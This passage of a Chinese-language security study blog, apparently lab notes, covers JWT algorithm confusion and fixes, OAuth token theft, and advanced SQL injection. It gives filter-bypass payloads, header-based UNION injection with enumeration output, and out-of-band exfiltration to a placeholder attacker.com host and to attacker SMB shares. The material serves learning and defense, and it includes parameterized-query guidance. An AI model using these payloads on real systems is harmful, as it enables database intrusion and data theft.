<p>这种攻击的本质是<strong>签名算法混淆</strong>，利用了 JWT 验证库在处理不同算法类型时的<strong>逻辑缺陷</strong>，特别是当允许混用对称和非对称算法时。攻击者不需要破解私钥，也不需要知道真正的 HS256 秘密密钥，只需要利用服务器公开的公钥就能伪造签名。</p>
<h4 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">header </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">get_unverified_header</span><span style="color: #ABB2BF">(token)</span></span>
<span class="line"><span style="color: #ABB2BF">algorithm </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> header[</span><span style="color: #98C379">&#39;alg&#39;</span><span style="color: #ABB2BF">]</span></span>
<span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;RS&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> algorithm: </span><span style="color: #7F848E; font-style: italic"># 如果是RS算法，则明确用公钥验证</span></span>
<span class="line"><span style="color: #ABB2BF">    payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.public_key, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;RS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;RS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;RS512&quot;</span><span style="color: #ABB2BF">])</span></span>
<span class="line"><span style="color: #C678DD">elif</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HS&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> algorithm: </span><span style="color: #7F848E; font-style: italic"># 如果是HS算法，则明确用秘密密钥验证</span></span>
<span class="line"><span style="color: #ABB2BF">    payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS384&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;HS512&quot;</span><span style="color: #ABB2BF">])</span></span></code></pre></div></div></figure>

<p>这个修复的关键在于：</p>
<ol>
<li><strong>根据 JWT 头部声明的 <code>alg</code> 字段，明确区分是使用 <code>public_key</code> 还是 <code>secret</code> 进行验证。</strong></li>
<li>同时，<code>algorithms</code> 参数还限制了<strong>只允许特定范围的算法</strong>，避免了 <code>None</code> 算法降级。</li>
</ol>
<h2 id="有效期"><a href="#有效期" class="headerlink" title="有效期"></a>有效期</h2><p><strong>如果 JWT 中没有设置 <code>exp</code> (expiration time) 声明，或者 <code>exp</code> 值设置得过大，那么这个 JWT 就可能是永久有效的，或者有效期过长。</strong></p>
<ol>
<li><strong><code>exp</code> (Expiration Time) 声明的重要性：</strong><ul>
<li>在验证 JWT 签名之前，一个重要的步骤是检查 JWT 的<strong>生命周期</strong>。这通常是通过读取 <code>payload</code> 中的 <code>exp</code>（过期时间）声明来完成的。</li>
<li>如果当前时间超过了 <code>exp</code> 指定的时间，那么 JWT 应该被认为是无效的。</li>
</ul>
</li>
<li><strong><code>exp</code> 值过大或缺失的问题：</strong><ul>
<li><strong><code>exp</code> 值设置太大：</strong> 即使设置了 <code>exp</code>，但如果过期时间被设置得非常遥远（比如几十年后），那么这个 JWT 实际上也接近于永久有效。</li>
<li><strong><code>exp</code> 值未设置：</strong> 如果 JWT 的 <code>payload</code> 中根本没有 <code>exp</code> 这个声明，那么大多数 JWT 库在默认情况下，只要签名验证通过，就会认为这个 token 是<strong>永久有效</strong>的，因为它没有一个明确的过期时间来拒绝它。</li>
<li><strong>后果：</strong> 这种“永久有效”或“超长有效期”的 JWT 存在巨大的安全风险。如果一个用户的 JWT 被泄露（例如，通过会话劫持、XSS 攻击、用户设备丢失等），攻击者就可以<strong>无限期地</strong>使用这个泄露的 JWT 来冒充合法用户，直到服务器端采取其他方式（如密钥轮换、IP 白名单等）来使其失效。</li>
</ul>
</li>
<li><strong>JWT 与传统 Cookie 的区别：</strong><ul>
<li><strong>Cookie：</strong> 传统的会话管理中，服务器可以在任何时候通过使服务器端的会话失效（例如，从数据库中删除会话记录）来“吊销”一个 Cookie。</li>
<li><strong>JWT：</strong> JWT 的设计理念是<strong>无状态 (stateless)</strong> 和 <strong>去中心化 (decentralized)</strong>。一旦 JWT 被签发并发送给客户端，服务器就不再存储其状态。这意味着，如果你想在 <code>exp</code> 时间之前使一个 JWT 失效，你就必须维护一个<strong>黑名单 (blocklist &#x2F; denylist)</strong> 来记录所有被吊销的 JWT。维护黑名单会增加服务器端的复杂性，并且在一定程度上打破了 JWT 无状态的优势。</li>
</ul>
</li>
<li><strong>选择正确的 <code>exp</code> 值：</strong><ul>
<li>因此，选择一个合适的 <code>exp</code> 值非常关键，它应该根据应用程序的敏感性和功能来确定。</li>
<li>例如，银行应用（高度敏感）的 JWT 可能只有几分钟的有效期，而邮件服务器（相对不那么敏感）的 JWT 可能有几个小时甚至几天的有效期。</li>
</ul>
</li>
<li><strong>刷新令牌 (Refresher Tokens)：</strong><ul>
<li>刷新令牌是一种常见的解决方案，用于解决 JWT 有效期短和用户体验之间的平衡问题。</li>
<li>它通常配合一个短期有效的 <code>access token</code>（用于每次请求）和一个长期有效的 <code>refresh token</code>（用于在 <code>access token</code> 过期后获取新的 <code>access token</code>）。</li>
<li><code>refresh token</code> 通常只在少数特定端点使用，并且可以被服务器端存储和吊销。</li>
</ul>
</li>
</ol>
<h4 id="开发错误与修复"><a href="#开发错误与修复" class="headerlink" title="开发错误与修复"></a>开发错误与修复</h4><ul>
<li><strong>错误：</strong> 没有在 JWT 的 <code>payload</code> 中包含 <code>exp</code> 声明，导致 token 永久有效。</li>
<li><strong>修复：</strong> 在签发 JWT 时，<strong>务必在 <code>payload</code> 中添加 <code>exp</code> 声明</strong>，并将其设置为一个合理的、有限的时间。大多数 JWT 库在解码时会自动检查这个 <code>exp</code> 声明。</li>
</ul>
<h2 id="跨服务中继攻击"><a href="#跨服务中继攻击" class="headerlink" title="跨服务中继攻击"></a>跨服务中继攻击</h2><p>简单来说是一个 API 的 JWT 可以在另外一个 API 上作用，原因是 JWT 没有验证 audience 字段</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> jwt.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(token, </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.secret, </span><span style="color: #E06C75; font-style: italic">audience</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&quot;appA&quot;</span><span style="color: #ABB2BF">], </span><span style="color: #E06C75; font-style: italic">algorithms</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;HS256&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>

<h1 id="OAuth-漏洞"><a href="#OAuth-漏洞" class="headerlink" title="OAuth 漏洞"></a>OAuth 漏洞</h1><p>OAuth 实际上是调用第三方&#x2F;第一方的认证接口，比如说 QQ 快捷登录，拿到用户的在第三方&#x2F;第一方的凭证，这样我们作为调用方就有用户的相关信息和凭据了，然后我们再拿着用户的凭据(token)去调用相关需要凭证才能调用的接口，这样就是一个 OAuth 过程了。</p>
<p>里面容易存在的漏洞我觉得主要还是在那个 token 本身。</p>
<h2 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h2><h3 id="Resource-Owner"><a href="#Resource-Owner" class="headerlink" title="Resource Owner"></a>Resource Owner</h3><p>字面意思，就相当于在软件开屏的时候，提示你是否授权给应用程序，这时你就是你的资源所有者。</p>
<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p>Client 在 OAuth 流程中，是指<strong>代表资源所有者（用户）向授权服务器请求访问受保护资源的应用程序</strong>。</p>
<h3 id="Authorization-Server"><a href="#Authorization-Server" class="headerlink" title="Authorization Server"></a>Authorization Server</h3><p>在成功认证之后，颁发 token 给 client，还有一点就是问你是否允许客户端访问你的数据。</p>
<h3 id="Resource-Server"><a href="#Resource-Server" class="headerlink" title="Resource Server"></a>Resource Server</h3><p>就相当于数据库了，这里的意思是托管着用户的受保护资源，要有有效的 token，才会返回数据。</p>
<h3 id="Authorization-Grant"><a href="#Authorization-Grant" class="headerlink" title="Authorization Grant"></a>Authorization Grant</h3><p>主要的同意类型有 <code>Authorization Code</code>, <code>Implicit</code>, <code>Resource Owner Password Credentials</code>, and <code>Client Credentials</code>.</p>
<h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>短效，通常使用范围受限。</p>
<h3 id="Refresh-Token"><a href="#Refresh-Token" class="headerlink" title="Refresh Token"></a>Refresh Token</h3><p>用来生成 access token 的，长效。</p>
<h3 id="Redirect-URI"><a href="#Redirect-URI" class="headerlink" title="Redirect URI"></a>Redirect URI</h3><p>是授权服务器在完成用户认证和授权后，将用户的浏览器重定向回去的“客户端应用的接收地址”。</p>
<p>对于 URI 应该会有强校验，不然就随便跳了。</p>
<h3 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h3><p>权限范围吧。</p>
<h3 id="State-Parameter"><a href="#State-Parameter" class="headerlink" title="State Parameter"></a>State Parameter</h3><p>在请求登录的时候，跳到 OAuth 时会发一个 state，服务器返回一个 state，客户端会比对这个 state 是否一样。</p>
<p>如果是 CSRF 请求的话，总得要跳过去得到用户授权，如果直接请求的话那拿不到，就相当于一次请求是带了个验证码。</p>
<h3 id="Token-Authorization-Endpoint"><a href="#Token-Authorization-Endpoint" class="headerlink" title="Token &amp; Authorization Endpoint"></a>Token &amp; Authorization Endpoint</h3><p>认证的两个 API 吧，一个负责用户认证，一个负责颁发 Token。</p>
<h2 id="Grant-Types"><a href="#Grant-Types" class="headerlink" title="Grant Types"></a>Grant Types</h2><p>有好多种，主要是熟悉一下那些数据流，看看图片就理解了。</p>
<h2 id="鉴别-OAuth-框架"><a href="#鉴别-OAuth-框架" class="headerlink" title="鉴别 OAuth 框架"></a>鉴别 OAuth 框架</h2><ul>
<li>看 HTTP 头和响应</li>
<li>看源码<ul>
<li>js 库</li>
</ul>
</li>
<li>看 URL<ul>
<li>有固定格式，特征</li>
</ul>
</li>
<li>看错误信息</li>
</ul>
<h2 id="偷-OAuth-Token"><a href="#偷-OAuth-Token" class="headerlink" title="偷 OAuth Token"></a>偷 OAuth Token</h2><h3 id="redirect-url-没有被保护"><a href="#redirect-url-没有被保护" class="headerlink" title="redirect_url 没有被保护"></a>redirect_url 没有被保护</h3><p>攻击者可以构造 OAuth 链接然后诱导用户点击，token 被发到伪造的 URL 去（因为跳转链接就是携带 token 过去的地方）</p>
<h3 id="缺-state"><a href="#缺-state" class="headerlink" title="缺 state"></a>缺 state</h3><p>攻击者构造一个属于自己账户的认证链接，诱导用户点击。本来正常的认证是要带一个 state 参数的（这个参数是存在用户本地的，攻击者拿不到），但是因为认证服务器的问题，不检验这个字段，导致 token 点击就送。</p>
<h3 id="隐式授权流"><a href="#隐式授权流" class="headerlink" title="隐式授权流"></a>隐式授权流</h3><p>token 会显示在 url 中，攻击者可以构造 XSS，去偷 token。</p>
<h1 id="MFA"><a href="#MFA" class="headerlink" title="MFA"></a>MFA</h1><p>主要就是请求带验证码，密码验证之后能绕过，OTP 爆破。</p>
<h1 id="Hammer"><a href="#Hammer" class="headerlink" title="Hammer"></a>Hammer</h1><p>这一关感觉比较难了…因为那个 session 有尝试有效期，刚开始在 burp 里面折腾更新 cookie 很久，后面发现那样执行的话还是有失效的可能。转而写 python 脚本，单线程在慢慢跑。</p>
<h1 id="Advanced-SQL-Injection"><a href="#Advanced-SQL-Injection" class="headerlink" title="Advanced SQL Injection"></a>Advanced SQL Injection</h1><p>讲了一些二次注入的技巧，靠二次查询触发 SQL 注入，也就是把 SQL 语句拼接在那个查询 SQL 语句的后面</p>
<h2 id="SQL-绕过技巧"><a href="#SQL-绕过技巧" class="headerlink" title="SQL 绕过技巧"></a>SQL 绕过技巧</h2><h3 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h3><ul>
<li>URL 编码<ul>
<li>‘ OR 1&#x3D;1– can be encoded as %27%20OR%201%3D1–</li>
</ul>
</li>
<li>八进制编码<ul>
<li>SELECT * FROM users WHERE name &#x3D; ‘admin’ can be encoded as SELECT * FROM users WHERE name &#x3D; 0x61646d696e</li>
</ul>
</li>
<li>Unicode 编码<ul>
<li>admin can be encoded as \u0061\u0064\u006d\u0069\u006e</li>
</ul>
</li>
</ul>
<p>可以用 || 替代 OR</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Intro to PHP&#39; || 1=1 --+</span></span>
<span class="line"><span style="color: #abb2bf">Intro%20to%20PHP%27%20%7C%7C%201=1%20--+</span></span></code></pre></div></div></figure>

<p>这里其实利用的是两个字符串与操作，只要有一个为真这个结果永远为真。</p>
<p>在 URL 编码 中 %20 和 + 等价，都是表示空格。</p>
<h3 id="没有引号的-SQL-注入"><a href="#没有引号的-SQL-注入" class="headerlink" title="没有引号的 SQL 注入"></a>没有引号的 SQL 注入</h3><ul>
<li>使用数值<ul>
<li>找一些不需要引号的注入点，直接用 OR 1&#x3D;1</li>
</ul>
</li>
<li>使用 SQL 注释<ul>
<li>用 <code>--</code> 我不太明白实际的用法，感觉更多的是让他去报错，因为注释掉了后面的话，语句都没有闭合了，肯定报错。</li>
</ul>
</li>
<li>使用 CONCAT()<ul>
<li><code>CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)</code> constructs the string admin</li>
</ul>
</li>
</ul>
<h3 id="不允许空格"><a href="#不允许空格" class="headerlink" title="不允许空格"></a>不允许空格</h3><ul>
<li>注释代替空格<ul>
<li>use SQL comments (<code>/**/</code>) to replace spaces</li>
</ul>
</li>
<li>Tab 或者换行符<ul>
<li>using tab (\t) or newline (\n)</li>
</ul>
</li>
<li>替代字符<ul>
<li>such as <code>%09</code> (horizontal tab), <code>%0A </code>(line feed), <code>%0C </code>(form feed), <code>%0D</code> (carriage return), and <code>%A0</code> (non-breaking space)</li>
</ul>
</li>
</ul>
<p>题目中 OR 也被过滤了，用 CONCAT 没用，最后还是用的两个 |，空格用 %09 代替。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%27%09||%091=1%09--%09</span></span></code></pre></div></div></figure>

<p>一些场景，可以给你绕过一些思路</p>
<table>
<thead>
<tr>
<th><strong>Scenario</strong></th>
<th><strong>Description</strong></th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Keywords like SELECT are banned</strong></td>
<td>SQL keywords can often be bypassed by changing their case or adding inline comments to break them up</td>
<td>SElEcT * FrOm users or SE&#x2F;<strong>&#x2F;LECT * FROM&#x2F;</strong>&#x2F;users</td>
</tr>
<tr>
<td><strong>Spaces are banned</strong></td>
<td>Using alternative whitespace characters or comments to replace spaces can help bypass filters.</td>
<td>SELECT%0A*%0AFROM%0Ausers or SELECT&#x2F;<strong>&#x2F;*&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td>
</tr>
<tr>
<td><strong>Logical operators like AND, OR are banned</strong></td>
<td>Using alternative logical operators or concatenation to bypass keyword filters.</td>
<td>username &#x3D; ‘admin’ &amp;&amp; password &#x3D; ‘password’ or username &#x3D; ‘admin’&#x2F;<strong>&#x2F;||&#x2F;</strong>&#x2F;1&#x3D;1 –</td>
</tr>
<tr>
<td><strong>Common keywords like UNION, SELECT are banned</strong></td>
<td>Using equivalent representations such as hexadecimal or Unicode encoding to bypass filters.</td>
<td>SElEcT * FROM users WHERE username &#x3D; CHAR(0x61,0x64,0x6D,0x69,0x6E)</td>
</tr>
<tr>
<td><strong>Specific keywords like OR, AND, SELECT, UNION are banned</strong></td>
<td>Using obfuscation techniques to disguise SQL keywords by combining characters with string functions or comments.</td>
<td>SElECT * FROM users WHERE username &#x3D; CONCAT(‘a’,’d’,’m’,’i’,’n’) or SElEcT&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</td>
</tr>
</tbody></table>
<h2 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h2><h3 id="不同数据库的使用方法"><a href="#不同数据库的使用方法" class="headerlink" title="不同数据库的使用方法"></a>不同数据库的使用方法</h3><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>可以写文件出来，然后用其他方式去访问这个文件</p>
<figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> sensitive_data </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> users </span><span style="color: #C678DD">INTO</span><span style="color: #ABB2BF"> OUTFILE </span><span style="color: #98C379">&#39;/tmp/out.txt&#39;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>

<h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><p>主要用的是 xp_cmdshell</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">EXEC xp_cmdshell &#39;bcp &quot;SELECT sensitive_data FROM users&quot; queryout &quot;\\10.10.58.187\logs\out.txt&quot; -c -T&#39;;</span></span></code></pre></div></div></figure>

<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">DECLARE</span></span>
<span class="line"><span style="color: #ABB2BF">  req </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">REQ</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">  resp </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">RESP</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">BEGIN</span></span>
<span class="line"><span style="color: #ABB2BF">  req :</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">BEGIN_REQUEST</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;http://attacker.com/exfiltrate?sensitive_data=&#39;</span><span style="color: #ABB2BF"> || sensitive_data);</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #D19A66">UTL_HTTP</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">GET_RESPONSE</span><span style="color: #ABB2BF">(req);</span></span>
<span class="line"><span style="color: #C678DD">END</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>

<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>在 mysql 中，如果 <code>secure_file_priv</code> 被设置的话，写入文件的目录就被限制住了</p>
<p>用这个命令开无密码共享</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># SMB 开本地共享</span></span>
<span class="line"><span style="color: #abb2bf">python github/impacket/examples/smbserver.py -smb2support -comment &quot;My Logs Server&quot; -debug logs /tmp</span></span></code></pre></div></div></figure>

<p>这是一个带外注入写 SMB 的实例。</p>
<figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #D19A66">1</span><span style="color: #98C379">&#39;; SELECT @@version INTO OUTFILE &#39;</span><span style="color: #ABB2BF">\\\\ATTACKBOX_IP\\logs\\</span><span style="color: #D19A66">out</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">txt</span><span style="color: #98C379">&#39;; --</span></span></code></pre></div></div></figure>

<h2 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h2><h3 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h3><p>一些可能会把 HTTP 头的一些数据写进数据库，这就造成了注入点了。</p>
<p>比如 UA, Referer, X-Forward-For。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">curl -H &quot;User-Agent: &#39; UNION SELECT username, password FROM user; # &quot; http://10.10.115.31/httpagent/</span></span></code></pre></div></div></figure>

<figure class="shiki sql"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">&#39; UNION SELECT 1,database() ; # &quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">result: library</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">UNION</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,group_concat(table_name) </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">information_schema</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">tables</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">WHERE</span><span style="color: #ABB2BF"> table_schema </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;library&#39;</span><span style="color: #ABB2BF"> ; #</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">result: books,logs,user,visitor</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">&#39; UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;</span><span style="color: #ABB2BF">books</span><span style="color: #98C379">&#39; ; #</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">result: book_id,ssn,book_name,author,book_id,book_name,author,flag</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">UNION</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,group_concat(book_id,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_name,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,author,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_id,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_name,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,author,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,flag SEPARATOR </span><span style="color: #98C379">&#39;&lt;br&gt;&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> books ; #</span></span></code></pre></div></div></figure>

<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><h3 id="代码方面"><a href="#代码方面" class="headerlink" title="代码方面"></a>代码方面</h3><h4 id="参数化查询和预处理语句"><a href="#参数化查询和预处理语句" class="headerlink" title="参数化查询和预处理语句"></a>参数化查询和预处理语句</h4><p>使用带参数的查询和预编译语句可以让用户的所有输入变成数据而不是可执行的语句。</p>
<figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$stmt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$pdo</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">prepare</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #C678DD">SELECT</span><span style="color: #98C379"> </span><span style="color: #ABB2BF">*</span><span style="color: #98C379"> </span><span style="color: #C678DD">FROM</span><span style="color: #98C379"> users </span><span style="color: #C678DD">WHERE</span><span style="color: #98C379"> username </span><span style="color: #56B6C2">=</span><span style="color: #98C379"> :username&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">$stmt</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">([</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">]);</span></span></code></pre></div></div></figure>

<p>像这样就提前把 SQL 语句传给服务器了，服务器只接受一个 username 字段，然后只把输入当成字符处理。</p>
<h4 id="输入校验和处理"><a href="#输入校验和处理" class="headerlink" title="输入校验和处理"></a>输入校验和处理</h4><p>Use built-in functions such as <code>htmlspecialchars()</code> and <code>filter_var()</code> in PHP to sanitise inputs effectively.</p>
<h4 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h4><p>避免用高权限数据库账户操作数据库</p>
<h4 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h4><p>封装 SQL 逻辑</p>
<h4 id="定期安全审计和代码审查"><a href="#定期安全审计和代码审查" class="headerlink" title="定期安全审计和代码审查"></a>定期安全审计和代码审查</h4><p>不用说</p>
<h3 id="SQL-注入高级技巧"><a href="#SQL-注入高级技巧" class="headerlink" title="SQL 注入高级技巧"></a>SQL 注入高级技巧</h3><p>以下是一些渗透测试人员在面对 SQL 注入漏洞时，常用的更高级的利用手法：</p>
<h4 id="利用特定数据库功能"><a href="#利用特定数据库功能" class="headerlink" title="利用特定数据库功能"></a>利用特定数据库功能</h4><p>不同的数据库管理系统（DBMS），如 MySQL、PostgreSQL、Oracle 和 MSSQL，都有自己独特的功能和语法。渗透测试人员需要了解目标 DBMS 的具体特性才能有效地利用它们。例如，<strong>MSSQL 支持 <code>xp_cmdshell</code> 命令，它能被用来执行操作系统命令</strong>，这允许攻击者在数据库服务器上运行系统级别的指令。</p>
<h4 id="利用详细错误信息"><a href="#利用详细错误信息" class="headerlink" title="利用详细错误信息"></a>利用详细错误信息</h4><p>攻击者可以利用应用程序返回的详细错误信息来获取数据库的架构和结构。<strong>基于错误的 SQL 注入</strong>就是指通过精心构造查询，故意让应用程序生成包含有用信息（如数据库版本、表名、列名等）的错误消息。例如，使用 <code>1&#39; AND 1=CONVERT(int, (SELECT @@version)) --</code> 这样的语句，可以触发错误并泄露数据库的版本信息。</p>
<h4 id="绕过-WAF-和过滤器"><a href="#绕过-WAF-和过滤器" class="headerlink" title="绕过 WAF 和过滤器"></a>绕过 WAF 和过滤器</h4><p>为了绕过 Web 应用防火墙（WAF）和输入过滤器，渗透测试人员会尝试各种混淆技术。这包括：</p>
<ul>
<li><strong>大小写混合</strong> (<code>SeLeCt</code>)。</li>
<li><strong>字符串连接</strong> (<code>CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))</code> 来代替 <code>SELECT</code>)。</li>
<li><strong>使用不同的编码方式</strong>（如十六进制编码、URL 编码）。</li>
<li><strong>利用内联注释</strong> (<code>/**/</code>) 和<strong>不同字符编码</strong>（如 <code>%09</code> 代表制表符，<code>%0A</code> 代表换行符）来绕过简单的过滤器。</li>
</ul>
